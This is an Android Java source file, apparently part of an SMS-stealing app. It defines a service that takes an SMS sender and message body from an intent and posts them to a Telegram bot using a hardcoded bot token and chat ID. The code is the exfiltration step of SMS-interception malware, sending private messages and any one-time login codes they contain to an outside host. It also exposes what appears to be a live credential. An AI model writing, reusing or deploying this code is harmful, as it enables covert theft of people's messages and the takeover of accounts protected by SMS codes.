package com.example.sms_reader;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramService extends Service {
    private static final String BOT_TOKEN = "7908452236:AAGBQ8nws8k1pUNNU_swTgIiErhqhD9u8JY";
    private static final String CHAT_ID = "1274939394";


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String sender = intent.getStringExtra("sender");
        String message = intent.getStringExtra("message");
        new Thread(() -> sendToTelegram(sender, message)).start();
        return START_NOT_STICKY;
    }

    private void sendToTelegram(String sender, String message) {
        try {
            String text = "📩 New SMS\nFrom: " + sender + "\nMessage: " + message;
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";

            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            String jsonPayload = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" + text + "\"}";

            OutputStream os = conn.getOutputStream();
            os.write(jsonPayload.getBytes());
            os.flush();
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d("TelegramService", "Response: " + responseCode);

        } catch (Exception e) {
            Log.e("TelegramService", "Error: ", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}